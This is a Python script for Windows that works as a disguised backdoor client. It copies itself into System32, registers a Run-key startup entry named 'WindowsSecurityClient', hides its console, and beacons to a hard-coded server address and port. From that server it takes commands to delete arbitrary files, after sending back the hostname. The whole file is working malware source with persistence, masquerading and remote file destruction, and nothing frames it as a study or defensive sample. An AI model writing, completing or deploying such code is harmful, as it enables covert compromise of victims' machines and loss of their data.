import socket
import os
import sys
import time
import shutil
import winreg
import ctypes
from threading import Thread

# Client settings
SERVER_HOST = '169.254.53.82'  # Server IP address (change to the real server IP)
SERVER_PORT = 9999         # Server port

# Client system settings
CLIENT_FILENAME = os.path.basename(sys.argv[0])
SYSTEM_DIR = os.path.join(os.environ['WINDIR'], 'System32')
STARTUP_NAME = "WindowsSecurityClient"

def is_admin():
    """Check for admin rights"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def copy_to_system_dir():
    """Copy client file to system directory"""
    try:
        if not os.path.exists(os.path.join(SYSTEM_DIR, CLIENT_FILENAME)):
            shutil.copy2(sys.argv[0], os.path.join(SYSTEM_DIR, CLIENT_FILENAME))
            print(f"[*] File copied to {SYSTEM_DIR}")
        return True
    except Exception as e:
        print(f"[!] Failed to copy file: {e}")
        return False

def add_to_startup():
    """Add program to startup"""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, winreg.KEY_ALL_ACCESS
        )
        system_path = os.path.join(SYSTEM_DIR, CLIENT_FILENAME)
        winreg.SetValueEx(key, STARTUP_NAME, 0, winreg.REG_SZ, system_path)
        winreg.CloseKey(key)
        print("[*] Program added to startup")
        return True
    except Exception as e:
        print(f"[!] Failed to add to startup: {e}")
        return False

def hide_console_window():
    """Hide console window"""
    try:
        
        if os.name == 'nt':
            import win32console
            import win32gui
            window = win32console.GetConsoleWindow()
            win32gui.ShowWindow(window, 0)  # 0 - SW_HIDE
            print("[*] Window hidden")
        return True
    except Exception as e:
        print(f"[!] Failed to hide window: {e}")
        return False

def perform_masking():
    """Perform all masking procedures"""
    if copy_to_system_dir():
        if add_to_startup():
            hide_console_window()

def delete_file(filename):
    """Delete file"""
    try:
        if os.path.exists(filename):
            os.remove(filename)
            return f"File {filename} successfully deleted"
        else:
            return f"File {filename} not found"
    except Exception as e:
        return f"Error deleting file {filename}: {e}"

def handle_connection(server_socket):
    """Handle connection with server"""
    try:

        hostname = socket.gethostname()
        client_info = f"Client: {hostname}, OS: Windows"
        server_socket.send(client_info.encode('utf-8'))
        
        command = server_socket.recv(1024).decode('utf-8')
        print(f"[*] Command received: {command}")

        if command.startswith("DELETE:"):
            filename = command.split(":", 1)[1]
            result = delete_file(filename)
            server_socket.send(result.encode('utf-8'))
        else:
            server_socket.send("Unknown command".encode('utf-8'))
            
    except Exception as e:
        print(f"[!] Error handling connection: {e}")

def connect_to_server():
    """Connect to server"""
    while True:
        try:
            print(f"[*] Attempting to connect to server {SERVER_HOST}:{SERVER_PORT}...")
            
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            
            print("[+] Connection with server established")
            
            handle_connection(client_socket)
            
            client_socket.close()
            
            time.sleep(60)
            
        except socket.error as e:
            print(f"[!] Failed to connect to server: {e}")
            time.sleep(5)
        except Exception as e:
            print(f"[!] An error occurred: {e}")
            time.sleep(5)

def main():
    if not is_admin():
        print("[!] Admin rights required for proper operation")
    
    perform_masking()
    
    connect_thread = Thread(target=connect_to_server)
    connect_thread.daemon = True
    connect_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down client...")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()